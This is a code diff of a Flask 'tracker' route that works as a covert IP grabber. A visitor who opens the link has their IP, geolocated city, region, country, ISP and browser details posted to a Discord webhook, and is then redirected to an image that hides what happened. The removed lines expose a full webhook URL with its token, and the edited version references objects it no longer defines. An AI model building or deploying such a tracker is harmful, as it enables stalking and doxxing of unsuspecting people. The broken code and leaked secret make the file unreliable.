@@ -1,32 +1,27 @@
-from flask import Flask, request, redirect
-import requests
-import traceback
-
-app = Flask(__name__)
-
-WEBHOOK_URL = "https://discordapp.com/api/webhooks/1360532705644773546/lc5c8r8P_MC-MJRytn7ea7ZaANatkhXlf15_sRYT6Ist5oV5eEM-KtRLUKWYZe0RrgKX"
-
-# Add a root route to handle requests to "/"
-@app.route('/')
-def home():
-    return "Welcome to the tracker!"
+from user_agents import parse
 
 @app.route('/track')
 def track():
     try:
         ip = request.remote_addr or 'unknown'
-        user_agent = request.headers.get('User-Agent', 'unknown')
+        user_agent_string = request.headers.get('User-Agent', 'unknown')
+        
+        # Parse the user-agent string
+        user_agent = parse(user_agent_string)
 
-        # Get geo info from IP (handle possible errors)
-        try:
-            geo = requests.get(f"https://ipapi.co/{ip}/json/").json()
-        except Exception as e:
-            geo = {"city": "Unknown", "region": "Unknown", "country_name": "Unknown", "org": "Unknown"}
-            print(f"Error fetching geo data: {str(e)}")
+        # Extract specific details from the parsed user agent
+        browser = user_agent.browser.family  # e.g., Chrome, Firefox
+        os = user_agent.os.family  # e.g., Windows, macOS
+        device = user_agent.device.family  # e.g., Desktop, Mobile
 
+        # Print parsed info to check
+        print(f"Browser: {browser}, OS: {os}, Device: {device}")
+        
+        # Get geo info (use ipinfo.io or any other service)
+        geo = requests.get(f"https://ipinfo.io/{ip}/json").json()
         city = geo.get("city", "Unknown")
         region = geo.get("region", "Unknown")
-        country = geo.get("country_name", "Unknown")
+        country = geo.get("country", "Unknown")
         org = geo.get("org", "Unknown")
 
         # Build message
@@ -35,24 +30,16 @@ def track():
             f"🌍 IP: `{ip}`\n"
             f"📍 Location: {city}, {region}, {country}\n"
             f"🏢 ISP: {org}\n"
-            f"🖥️ User-Agent: `{user_agent}`"
+            f"🖥️ User-Agent: {browser} on {os} ({device})"
         )
 
         # Send to Discord
-        try:
-            requests.post(WEBHOOK_URL, json={"content": content})
-        except Exception as e:
-            print(f"Error sending to Discord: {str(e)}")
+        requests.post(WEBHOOK_URL, json={"content": content})
 
-        # Redirect to a safe placeholder image
-        return redirect("https://www.smartage.pl/wp-content/uploads/2023/04/67-1.jpg")
-    
+        # Redirect to your image link
+        return redirect("https://your-image-link.com")
+
     except Exception as e:
-        # Log the error and return a friendly message
         print(f"Error in track function: {str(e)}")
-        traceback.print_exc()  # This will print detailed error information to the logs
+        traceback.print_exc()  # Detailed error in logs
         return "Something went wrong", 500
-
-
-if __name__ == "__main__":
-    app.run(debug=True)
